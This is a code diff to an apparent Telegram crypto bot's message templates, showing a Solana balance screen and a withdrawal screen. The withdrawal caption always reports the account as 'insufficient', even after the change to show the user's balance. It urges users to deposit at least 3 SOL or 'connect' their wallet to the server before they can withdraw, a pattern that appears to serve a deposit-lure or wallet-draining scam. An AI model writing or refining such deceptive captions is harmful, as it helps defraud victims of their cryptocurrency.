@@ -18,7 +18,7 @@ export const balanceInfo = (user)=> ({
             `<b>USER-ID</b>: ${user.id}\n`+
             `<b>CA</b>: ${user.CA} \n\n`+
             `💳 <b>CURRENT BALANCE</b>\n\n`+
-            `. Available: <b>0 SOL</b>\n`+
+            `. Available: <b>${user.balance} SOL</b>\n`+
             `. Status: 🟢 ONLINE\n\n`+
             `     📊<b>SUMMARY</b>📊\n`+
             `. Incomplete Orders: <b>0</b>\n`+
@@ -32,11 +32,11 @@ export const balanceInfo = (user)=> ({
   ])
 })
 
-export const Withdraw = ()=> ({
+export const Withdraw = (user)=> ({
   media: {
     caption: `⚠️ <b>Current Account is insufficient</b>\n\n`+
-            `💳 CURRENT BALANCE: <b>0 SOL</b>\n\n`+
-            `. <i>Please deposit at least 5 SOL to your wallet or Connect your wallet to the server to access withdrawal</i>`,
+            `💳 CURRENT BALANCE: <b>${user.balance} SOL</b>\n\n`+
+            `. <i>Please deposit at least 3 SOL to your wallet or Connect your wallet to the server to access withdrawal</i>`,
     parse_mode: 'HTML'
   },
   extra: Markup.inlineKeyboard([
